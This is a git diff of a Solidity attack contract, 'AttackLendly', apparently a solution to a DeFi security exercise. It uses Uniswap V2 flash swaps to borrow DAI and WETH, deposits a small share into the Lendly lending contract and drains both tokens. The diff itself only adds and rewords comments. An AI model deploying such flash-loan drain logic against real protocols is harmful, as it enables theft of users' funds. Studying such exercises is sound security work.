@@ -12,15 +12,18 @@ import "forge-std/console.sol";
 contract AttackLendly is Ownable {
     IUniswapV2Pair private immutable pair;
     Lendly private immutable lendly;
+
+    // token0 = DAI
     address private immutable token0;
+    // token1 = WETH
     address private immutable token1;
+
     uint112 private reserve0;
     uint112 private reserve1;
 
     constructor(address _pair, address _lendly) {
         pair = IUniswapV2Pair(_pair);
         lendly = Lendly(_lendly);
-        // token0 = DAI, token1 = WETH
         token0 = IUniswapV2Pair(pair).token0();
         token1 = IUniswapV2Pair(pair).token1();
     }
@@ -28,6 +31,8 @@ contract AttackLendly is Ownable {
     function attack() external onlyOwner {
         uint256 wantedLoan;
         bytes memory data;
+
+        // 1.Step - Get a DAI flash swap and drain all WETH
 
         // Get reserves of the  Pair smart contract
         (reserve0, reserve1,) = pair.getReserves();
@@ -37,6 +42,7 @@ contract AttackLendly is Ownable {
 
         pair.swap(wantedLoan, 0, address(this), data);
 
+        // 2.Step - Get a WETH flash swap and drain all DAI
         // Get reserves of the  Pair smart contract
         (reserve0, reserve1,) = pair.getReserves();
 
@@ -59,12 +65,14 @@ contract AttackLendly is Ownable {
         // Deposit %0.1 of the amount because it is really expensive
 
         uint256 depositAmount = amount * 1 / 1000;
+
         IERC20(token).approve(address(lendly), depositAmount);
         lendly.deposit(token, depositAmount);
 
         // Determine other token address
         address otherToken;
         uint256 otherTokenReserve;
+
         if (token == token0) {
             otherToken = token1;
             otherTokenReserve = reserve1;
@@ -80,7 +88,7 @@ contract AttackLendly is Ownable {
 
         uint256 tokenPaymentAmount = amount * 999 / 1000;
 
-        // Amount to pay in the other token - other token reserve * 4 / 1000 (3 percent fee + 1 percent other token)
+        // Amount to pay in the other token - other token reserve * 4 / 1000 (3 percent fee + 1 percent borrowed token) because 1% stayed in the Lendly
         uint256 otherTokenPaymentAmount = otherTokenReserve * 4 / 1000;
 
         IERC20(token).transfer(address(pair), tokenPaymentAmount);
